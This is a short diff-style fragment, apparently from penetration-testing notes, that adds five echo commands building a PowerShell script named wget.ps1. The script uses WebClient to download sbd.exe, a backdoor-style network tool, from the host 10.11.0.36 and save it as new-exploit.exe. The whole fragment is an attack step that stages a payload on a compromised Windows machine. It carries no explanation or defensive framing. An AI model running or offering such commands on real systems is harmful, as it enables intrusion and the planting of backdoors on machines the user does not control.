@@ -1,0 +1,5 @@
+echo $storageDir = $pwd > wget.ps1
+echo $webclient = New-Object System.Net.WebClient >>wget.ps1 
+echo $url = "http://10.11.0.36/sbd.exe" >>wget.ps1 
+echo $file = "new-exploit.exe" >>wget.ps1
+echo $webclient.DownloadFile($url,$file) >>wget.ps1
